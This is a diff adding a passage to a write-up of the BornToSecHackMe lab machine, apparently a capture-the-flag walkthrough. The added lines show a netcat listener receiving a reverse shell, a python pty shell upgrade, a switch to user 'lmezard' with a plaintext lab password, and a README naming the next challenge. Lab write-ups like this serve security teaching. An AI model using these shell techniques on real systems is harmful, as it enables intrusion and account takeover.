@@ -243,6 +243,25 @@ su lmezard
 ```
 with a research on [internet](https://unix.stackexchange.com/questions/594264/error-su-must-be-run-from-a-terminal?__cf_chl_tk=.M.TvcaACsdi9g3YQYNf2kmx6stuQibrlhF7rA6zHQ0-1782222640-1.0.1.1-DY6ddXZzuy2MR7gNUHQnMudBNiy6mAtwy_Sat_SO_EE) we found : ``python -c 'import pty; pty.spawn("/bin/sh")'``
 
+and 
+
+```shell
+nc -lnvp 1234
+>>Listening on 0.0.0.0 1234
+>>Connection received on 192.168.1.64 54653
+>>/bin/sh: 0: can t access tty; job control turned off
+python -c 'import pty; pty.spawn("/bin/sh")'
+su lmezard
+Password: 'G!@M6f4Eatau{sF"'
+lmezard@BornToSecHackMe:/var/www/forum/templates_c$
+lmezard@BornToSecHackMe:/var/www/forum/templates_c$ cd 
+lmezard@BornToSecHackMe:~$ ls
+>>fun  README
+lmezard@BornToSecHackMe:~$ cat README
+>>Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+```
+
+The fun file looks like the topic "problem login ?" and we noticed that topic was modified by the admin so we will find usefull datas. 
 
 ## Users informations
 
